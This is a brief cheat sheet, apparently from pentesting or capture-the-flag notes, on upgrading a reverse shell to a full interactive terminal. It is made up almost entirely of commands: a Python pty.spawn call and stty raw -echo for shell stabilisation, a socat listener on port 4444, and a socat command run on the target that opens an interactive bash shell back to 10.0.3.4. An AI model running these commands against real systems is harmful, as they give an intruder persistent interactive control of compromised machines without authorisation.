# stty  
#### target's reverse shell

```
python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z
```

#### host's shell

```
stty raw -echo
fg
```

# socat  
#### listener:

```
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

#### target :

```
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
